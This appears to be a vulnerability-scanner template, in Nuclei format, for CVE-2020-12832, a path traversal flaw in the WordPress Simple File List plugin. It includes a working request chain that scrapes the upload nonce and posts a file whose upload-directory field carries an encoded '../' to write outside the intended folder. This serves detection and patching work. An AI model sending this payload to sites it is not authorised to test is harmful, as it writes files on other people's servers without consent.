id: CVE-2020-12832
info:
  author: riteshs4hu
  classification:
    cpe: cpe:2.3:a:simplefilelist:simple-file-list::::::wordpress::*
    cve-id: CVE-2020-12832
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-22
    epss-percentile: 0.98733
    epss-score: 0.73235
  description: 'Simple File List plugin allows path traversal via file upload, enabling
    files to be written outside the upload directory.

    '
  impact: 'Attackers can delete arbitrary files on the server, potentially causing
    data loss or service disruption.

    '
  metadata:
    max-request: 3
    product: Simple File List WordPress Plugin
    vendor: Simple File List
    verified: true
  name: WordPress Simple File List - Path Traversal
  reference:
  - https://wpscan.com/vulnerability/422360b9-4c70-4fd9-9833-375f1294bd7a/
  - http://nvd.nist.gov/vuln/detail/CVE-2020-12832
  remediation: 'Update to version 4.2.8 or later.

    '
  severity: critical
  tags: cve,cve2020,wp,wordpress,wp-plugin,traversal,simple-file-list,lfi,vkev
requests:
- extractors:
  - internal: true
    json:
    - .[] | select(.content.rendered | contains("eeSFL_UploadGo")) | .slug
    name: slug
    type: json
  raw:
  - 'GET /?rest_route=/wp/v2/pages&per_page=100 HTTP/1.1

    Host: {{Hostname}}

    '
- extractors:
  - group: 1
    internal: true
    name: sflnonce
    regex:
    - name="ee-simple-file-list-upload-nonce"[^>]*?value="([A-Za-z0-9]+)"
    type: regex
  - group: 1
    internal: true
    name: sflid
    regex:
    - id="eeSFL_ID">([0-9]+)
    type: regex
  - group: 1
    internal: true
    name: ext
    regex:
    - eeSFL_FileFormats\s*=\s*"([A-Za-z0-9]+)
    type: regex
  raw:
  - 'GET {{slug}}/ HTTP/1.1

    Host: {{Hostname}}

    '
- raw:
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytA7kTuCe4IHDaUBZ


    ------WebKitFormBoundarytA7kTuCe4IHDaUBZ

    Content-Disposition: form-data; name="action"


    sfl_upload_job

    ------WebKitFormBoundarytA7kTuCe4IHDaUBZ

    Content-Disposition: form-data; name="file"; filename="{{rand}}.{{ext}}"

    Content-Type: application/octet-stream


    {{rand}}

    ------WebKitFormBoundarytA7kTuCe4IHDaUBZ

    Content-Disposition: form-data; name="eeSFL_ID"


    {{sflid}}

    ------WebKitFormBoundarytA7kTuCe4IHDaUBZ

    Content-Disposition: form-data; name="eeSFL_FileUploadDir"


    wp-content%2Fuploads%2Fsimple-file-list%2F..%2F

    ------WebKitFormBoundarytA7kTuCe4IHDaUBZ

    Content-Disposition: form-data; name="ee-simple-file-list-upload"


    {{sflnonce}}

    ------WebKitFormBoundarytA7kTuCe4IHDaUBZ--

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, "{{rand}}")
    type: dsl
  raw:
  - 'GET /wp-content/uploads/{{rand}}.{{ext}} HTTP/1.1

    Host: {{Hostname}}

    '
variables:
  rand: '{{rand_base(7)}}'
